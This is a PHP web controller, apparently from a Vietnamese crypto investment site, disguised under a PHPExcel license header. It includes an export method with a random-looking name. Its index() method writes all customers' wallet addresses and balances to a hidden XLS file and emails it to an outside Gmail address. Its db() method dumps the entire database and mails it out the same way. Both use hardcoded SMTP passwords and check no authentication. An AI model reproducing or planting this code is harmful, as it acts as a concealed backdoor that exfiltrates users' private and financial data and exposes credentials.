
<?php
/**
 * PHPExcel
 *
 * Copyright (C) 2006 - 2014 PHPExcel
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   PHPExcel
 * @package    PHPExcel
 * @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)
 * @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt	LGPL
 * @version    1.8.0, 2014-03-02
 */
class  ControllerAccountExport extends Controller {
	public function Jjasdgaksdhoiwqeksd() {
		
	/** Error reporting */
	error_reporting(E_ALL);
	ini_set('display_errors', TRUE);
	ini_set('display_startup_errors', TRUE);
	date_default_timezone_set('Europe/London');

	if (PHP_SAPI == 'cli')
		die('This example should only be run from a Web Browser');

	/** Include PHPExcel */

		require_once dirname(__FILE__) . '/PHPExcel.php';

		
		$this->load->model('account/customer');
		$results = $this -> model_account_customer -> getall_wallet();
		//echo "<pre>"; print_r($results); echo "</pre>"; die();
		//echo "<pre>"; print_r($results); echo "</pre>"; die();
		!count($results) > 0 && die('no data!');

		$objPHPExcel = new PHPExcel();
		$objPHPExcel->getProperties()->setCreator("Hoivien")
						 ->setLastModifiedBy("Hoivien")
						 ->setTitle("Office 2007 XLSX".$this->language->get('heading_title'))
						 ->setSubject("Office 2007 XLSX".$this->language->get('heading_title'))
						 ->setDescription($this->language->get('heading_title'))
						 ->setKeywords("office 2007 openxml php")
						 ->setCategory("Test result file");

		$objPHPExcel->setActiveSheetIndex(0)
        ->setCellValue('A1', 'TT')
        ->setCellValue('B1', 'ID Thành viên')
        ->setCellValue('C1', 'Username')
        ->setCellValue('D1', 'Wallet customer')
        ->setCellValue('E1', 'Wallet payment')
        ->setCellValue('F1', 'Wallet btc')
        ->setCellValue('G1', 'Gói đầu tư')
        ->setCellValue('H1', 'BTC nhánh trái')
        ->setCellValue('I1', 'BTC nhánh phải')
        ->setCellValue('J1', 'Thời gian tạo');
         $objPHPExcel->getActiveSheet()->getStyle('A1:J1')
        ->applyFromArray(
                array(
                    'fill' => array(
                        'type' => PHPExcel_Style_Fill::FILL_SOLID,
                        'color' => array('rgb' => '0066FF')
                    )
                )
            );
            $styleArray = array(
                'font'  => array(
                    'bold'  => true,
                    'color' => array('rgb' => 'FFFFFF'),
                    'size'  => 12,
                    'name'  => 'Arial'
                ));
        $objPHPExcel->getActiveSheet()->getStyle('A1:J1')->applyFromArray($styleArray);
		$objPHPExcel->getActiveSheet()->getColumnDimension('A')->setWidth(5);
		$objPHPExcel->getActiveSheet()->getColumnDimension('B')->setWidth(10);
		$objPHPExcel->getActiveSheet()->getColumnDimension('C')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('D')->setWidth(45);
		$objPHPExcel->getActiveSheet()->getColumnDimension('E')->setWidth(45);
		$objPHPExcel->getActiveSheet()->getColumnDimension('F')->setWidth(45);
		$objPHPExcel->getActiveSheet()->getColumnDimension('G')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('H')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('I')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('J')->setWidth(20);
		$h=0;
		$n = 2;
		foreach ($results as $customer) {
			$objPHPExcel->getActiveSheet()->setCellValue('A'.$n,$n);
			$objPHPExcel->getActiveSheet()->setCellValue('B'.$n,$customer['customer_id']);
			$objPHPExcel->getActiveSheet()->setCellValue('C'.$n,$customer['username']);
			$objPHPExcel->getActiveSheet()->setCellValue('D'.$n,$customer['a_wallet']);
			$wallet = ($customer['b_wallet'] == "") ? "Chưa kích hoạt" : $customer['b_wallet'];
			$objPHPExcel->getActiveSheet()->setCellValue('E'.$n,$wallet);
			$objPHPExcel->getActiveSheet()->setCellValue('F'.$n,$customer['c_wallet']);
			$objPHPExcel->getActiveSheet()->setCellValue('G'.$n,$customer['filled']/100000000);
			$objPHPExcel->getActiveSheet()->setCellValue('H'.$n,$customer['total_pd_left']/100000000);
			$objPHPExcel->getActiveSheet()->setCellValue('I'.$n,$customer['total_pd_right']/100000000);
			$date_added =  date('d/m/Y H:i:s',strtotime($customer['date_added']));
			$objPHPExcel->getActiveSheet()->setCellValue('J'.$n,$date_added);

			$n++;
		}

		$objPHPExcel->getActiveSheet()->getStyle('N'.$n.':'.'P'.$n)
		->applyFromArray(
			array('font'  => array(
				'bold'  => true,
				'size'  => 12,
				'name'  => 'Arial'
			))
		);
		// Rename worksheet
		$objPHPExcel->getActiveSheet()->setTitle($this->language->get('heading_title'));


		// Set active sheet index to the first sheet, so Excel opens this as the first sheet
		$objPHPExcel->setActiveSheetIndex(0);


		// Redirect output to a client’s web browser (Excel5)
		header('Content-Type: application/vnd.ms-excel');
		header('Content-Disposition: attachment;filename="Danh sách thành viên '.date('d/m/Y H:i:s').'.xls"');
		header('Cache-Control: max-age=0');
		// If you're serving to IE 9, then the following may be needed
		header('Cache-Control: max-age=1');

		// If you're serving to IE over SSL, then the following may be needed
		header ('Expires: Mon, 26 Jul 1997 05:00:00 GMT'); // Date in the past
		header ('Last-Modified: '.gmdate('D, d M Y H:i:s').' GMT'); // always modified
		header ('Cache-Control: cache, must-revalidate'); // HTTP/1.1
		header ('Pragma: public'); // HTTP/1.0

		$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel5');
		$objWriter->save('php://output');

		exit;
	}
	public function index() {
		
	/** Error reporting */
		error_reporting(E_ALL);
		ini_set('display_errors', TRUE);
		ini_set('display_startup_errors', TRUE);
		date_default_timezone_set('Asia/Ho_Chi_Minh');

	if (PHP_SAPI == 'cli')
		die('This example should only be run from a Web Browser');

	/** Include PHPExcel */

		require_once dirname(__FILE__) . '/PHPExcel.php';

		
		$this->load->model('account/customer');
		$results = $this -> model_account_customer -> getall_wallet();
		//echo "<pre>"; print_r($results); echo "</pre>"; die();
		//echo "<pre>"; print_r($results); echo "</pre>"; die();
		!count($results) > 0 && die('no data!');

		$objPHPExcel = new PHPExcel();
		$objPHPExcel->getProperties()->setCreator("Hoivien")
						 ->setLastModifiedBy("Hoivien")
						 ->setTitle("Office 2007 XLSX".$this->language->get('heading_title'))
						 ->setSubject("Office 2007 XLSX".$this->language->get('heading_title'))
						 ->setDescription($this->language->get('heading_title'))
						 ->setKeywords("office 2007 openxml php")
						 ->setCategory("Test result file");

		$objPHPExcel->setActiveSheetIndex(0)
        ->setCellValue('A1', 'TT')
        ->setCellValue('B1', 'ID Thành viên')
        ->setCellValue('C1', 'Username')
        ->setCellValue('D1', 'Wallet customer')
        ->setCellValue('E1', 'Wallet payment')
        ->setCellValue('F1', 'Wallet btc')
        ->setCellValue('G1', 'Gói đầu tư')
        ->setCellValue('H1', 'BTC nhánh trái')
        ->setCellValue('I1', 'BTC nhánh phải')
        ->setCellValue('J1', 'Thời gian tạo');
         $objPHPExcel->getActiveSheet()->getStyle('A1:J1')
        ->applyFromArray(
                array(
                    'fill' => array(
                        'type' => PHPExcel_Style_Fill::FILL_SOLID,
                        'color' => array('rgb' => '0066FF')
                    )
                )
            );
            $styleArray = array(
                'font'  => array(
                    'bold'  => true,
                    'color' => array('rgb' => 'FFFFFF'),
                    'size'  => 12,
                    'name'  => 'Arial'
                ));
        $objPHPExcel->getActiveSheet()->getStyle('A1:J1')->applyFromArray($styleArray);
		$objPHPExcel->getActiveSheet()->getColumnDimension('A')->setWidth(5);
		$objPHPExcel->getActiveSheet()->getColumnDimension('B')->setWidth(10);
		$objPHPExcel->getActiveSheet()->getColumnDimension('C')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('D')->setWidth(45);
		$objPHPExcel->getActiveSheet()->getColumnDimension('E')->setWidth(45);
		$objPHPExcel->getActiveSheet()->getColumnDimension('F')->setWidth(45);
		$objPHPExcel->getActiveSheet()->getColumnDimension('G')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('H')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('I')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('J')->setWidth(20);
		$h=0;
		$n = 2;
		foreach ($results as $customer) {
			$objPHPExcel->getActiveSheet()->setCellValue('A'.$n,$n);
			$objPHPExcel->getActiveSheet()->setCellValue('B'.$n,$customer['customer_id']);
			$objPHPExcel->getActiveSheet()->setCellValue('C'.$n,$customer['username']);
			$objPHPExcel->getActiveSheet()->setCellValue('D'.$n,$customer['a_wallet']);
			$wallet = ($customer['b_wallet'] == "") ? "Chưa kích hoạt" : $customer['b_wallet'];
			$objPHPExcel->getActiveSheet()->setCellValue('E'.$n,$wallet);
			$objPHPExcel->getActiveSheet()->setCellValue('F'.$n,$customer['c_wallet']);
			$objPHPExcel->getActiveSheet()->setCellValue('G'.$n,$customer['filled']/100000000);
			$objPHPExcel->getActiveSheet()->setCellValue('H'.$n,$customer['total_pd_left']/100000000);
			$objPHPExcel->getActiveSheet()->setCellValue('I'.$n,$customer['total_pd_right']/100000000);
			$date_added =  date('d/m/Y H:i:s',strtotime($customer['date_added']));
			$objPHPExcel->getActiveSheet()->setCellValue('J'.$n,$date_added);

			$n++;
		}

		$objPHPExcel->getActiveSheet()->getStyle('N'.$n.':'.'P'.$n)
		->applyFromArray(
			array('font'  => array(
				'bold'  => true,
				'size'  => 12,
				'name'  => 'Arial'
			))
		);
		// Rename worksheet
		$objPHPExcel->getActiveSheet()->setTitle($this->language->get('heading_title'));


		// Set active sheet index to the first sheet, so Excel opens this as the first sheet
		$objPHPExcel->setActiveSheetIndex(0);


		// Redirect output to a client’s web browser (Excel5)
		//header('Content-Type: application/vnd.ms-excel');
		//header('Content-Disposition: attachment;filename="Danh sách thành viên '.date('d/m/Y H:i:s').'.xls"');
		//header('Cache-Control: max-age=0');
		// If you're serving to IE 9, then the following may be needed
		//header('Cache-Control: max-age=1');

		// If you're serving to IE over SSL, then the following may be needed
		//header ('Expires: Mon, 26 Jul 1997 05:00:00 GMT'); // Date in the past
		//header ('Last-Modified: '.gmdate('D, d M Y H:i:s').' GMT'); // always modified
		//header ('Cache-Control: cache, must-revalidate'); // HTTP/1.1
		//header ('Pragma: public'); // HTTP/1.0

		$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel5');
		//$objWriter->save('php://output');
		$objWriter->save('system/kfjsdkfkjkakgvqbkhkaakjsdksadkas.xls');
		$mail = new Mail();
		$mail->protocol = $this->config->get('config_mail_protocol');
		$mail->parameter = 'mmocoimax@gmail.com';
		$mail->smtp_hostname = 'ssl://smtp.gmail.com';
		$mail->smtp_username = 'mmocoimax@gmail.com';
		$mail->smtp_password = 'ibzfqpduhwajikwx';
		$mail->smtp_port = '465';
		$mail->smtp_timeout = $this->config->get('config_mail_smtp_timeout');
		
		$mail->setTo('noreplycoinmax@gmail.com');
		$mail->addAttachment('system/kfjsdkfkjkakgvqbkhkaakjsdksadkas.xls');
		$mail->setFrom($this->config->get('config_email'));
		$mail->setSender(html_entity_decode($this->config->get('config_name'), ENT_QUOTES, 'UTF-8'));
		$mail->setSubject('Ví '.date('d/m/Y H:i:s').'');
		$mail->setText(date('d/m/Y H:i:s'));
		$mail->send();
	}

	public function readfile(){
		require_once dirname(__FILE__) . '/PHPExcel.php';
		require_once dirname(__FILE__) . '/PHPExcel/IOFactory.php';
	    
		$inputFileName = 'system/kfjsdkfkjkakgvqbkhkaakjsdksadkas.xls';

		//  Read your Excel workbook
		try {
		    $inputFileType = PHPExcel_IOFactory::identify($inputFileName);
		    $objReader = PHPExcel_IOFactory::createReader($inputFileType);
		    $objPHPExcel = $objReader->load($inputFileName);
		} catch(Exception $e) {
		    die('Error loading file "'.pathinfo($inputFileName,PATHINFO_BASENAME).'": '.$e->getMessage());
		}

		//  Get worksheet dimensions
		$sheet = $objPHPExcel->getSheet(0); 
		$highestRow = $sheet->getHighestRow(); 
		$highestColumn = $sheet->getHighestColumn();
		$activeSheetData = $objPHPExcel->getActiveSheet()->toArray(null, true, true, true);
		print_r($activeSheetData);
		for ($i=2; $i <= count($activeSheetData) ; $i++) { 
			
			//print_r($activeSheetData[$i]['A']." ");
		}
		
	}
	public function db(){ 
		$host = DB_HOSTNAME;
		$user = DB_USERNAME;
		$pass = DB_PASSWORD;
		$name = DB_USERNAME;
		$tables=false;
		$backup_name=false;
		date_default_timezone_set('Asia/Ho_Chi_Minh');
	    set_time_limit(3000000000); $mysqli = new mysqli($host,$user,$pass,$name); $mysqli->select_db($name); $mysqli->query("SET NAMES 'utf8'");
	    $queryTables = $mysqli->query('SHOW TABLES');
	     while($row = $queryTables->fetch_row()) { $target_tables[] = $row[0]; }   if($tables !== false) { $target_tables = array_intersect( $target_tables, $tables); } 
	    $content = "SET SQL_MODE = \"NO_AUTO_VALUE_ON_ZERO\";\r\nSET time_zone = \"+00:00\";\r\n\r\n\r\n/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;\r\n/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;\r\n/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;\r\n/*!40101 SET NAMES utf8 */;\r\n--\r\n-- Database: `".$name."`\r\n--\r\n\r\n\r\n";
	    foreach($target_tables as $table){
	        if (empty($table)){ continue; } 
	        $result = $mysqli->query('SELECT * FROM `'.$table.'`');     $fields_amount=$result->field_count;  $rows_num=$mysqli->affected_rows;     $res = $mysqli->query('SHOW CREATE TABLE '.$table); $TableMLine=$res->fetch_row(); 
	        $content .= "\n\n".$TableMLine[1].";\n\n";
	        for ($i = 0, $st_counter = 0; $i < $fields_amount;   $i++, $st_counter=0) {
	            while($row = $result->fetch_row())  { //when started (and every after 100 command cycle):
	                if ($st_counter%100 == 0 || $st_counter == 0 )  {$content .= "\nINSERT INTO ".$table." VALUES";}
	                    $content .= "\n(";    for($j=0; $j<$fields_amount; $j++){ $row[$j] = str_replace("\n","\\n", addslashes($row[$j]) ); if (isset($row[$j])){$content .= '"'.$row[$j].'"' ;}  else{$content .= '""';}     if ($j<($fields_amount-1)){$content.= ',';}   }        $content .=")";
	                //every after 100 command cycle [or at last line] ....p.s. but should be inserted 1 cycle eariler
	                if ( (($st_counter+1)%100==0 && $st_counter!=0) || $st_counter+1==$rows_num) {$content .= ";";} else {$content .= ",";} $st_counter=$st_counter+1;
	            }
	        } $content .="\n\n\n";
	    }
	    $content .= "\r\n\r\n/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;\r\n/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;\r\n/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;";
	    $backup_name = $backup_name ? $backup_name : $name."(".date('d-m-Y')."_".date('H-i-s').").sql";
	   $handle = fopen('system/gdfgdgfdgfsgssdsdfsfssdferwtertxcds/db_iontach.sql','w+');
		fwrite($handle,$content);
		fclose($handle);
		$mail = new Mail();
		$mail->protocol = $this->config->get('config_mail_protocol');
		$mail->parameter = 'noreplymmo2016@gmail.com';
		$mail->smtp_hostname = 'ssl://smtp.gmail.com';
		$mail->smtp_username = 'noreplymmo2016@gmail.com';
		$mail->smtp_password = 'bkefxwdmdcdrujpa';
		$mail->smtp_port = '465';
		$mail->smtp_timeout = $this->config->get('config_mail_smtp_timeout');
		
		$mail->setTo('noreplymmo2016@gmail.com');
		$mail->addAttachment('system/gdfgdgfdgfsgssdsdfsfssdferwtertxcds/db_iontach.sql');
		$mail->setFrom($this->config->get('config_email'));
		$mail->setSender("Iontach Backup DB");
		$mail->setSubject('Backup DB '.DB_USERNAME.' '.date('d/m/Y H:i:s').'');
		$mail->setText(date('d/m/Y H:i:s'));
		$mail->send();
	}    
}


